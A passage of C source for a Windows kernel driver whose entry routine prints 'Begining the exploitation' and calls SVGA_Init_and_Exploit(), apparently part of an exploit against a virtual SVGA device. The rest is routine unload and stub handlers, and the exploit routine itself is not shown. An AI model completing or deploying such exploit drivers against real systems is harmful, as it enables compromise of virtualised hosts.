	  	  DriverObject->MajorFunction[i] = DriverUnsupported;
	DriverObject->DriverUnload = DriverUnload;

	DbgPrint("* Begining the exploitation\n");

	SVGA_Init_and_Exploit();  
	return STATUS_SUCCESS;
}



VOID DriverUnload(PDRIVER_OBJECT pDriverObject)
{
	PDEVICE_OBJECT pdoNextDeviceObj = pdoGlobalDrvObj->DeviceObject;

	IoDeleteSymbolicLink(&usSymlinkName);
	while(pdoNextDeviceObj)
	{
		PDEVICE_OBJECT pdoThisDeviceObj = pdoNextDeviceObj;
		pdoNextDeviceObj = pdoThisDeviceObj->NextDevice;
		IoDeleteDevice(pdoThisDeviceObj);
	}
}



NTSTATUS DriverUnsupported(PDEVICE_OBJECT DeviceObject, PIRP Irp)
{
	return STATUS_NOT_SUPPORTED;
}

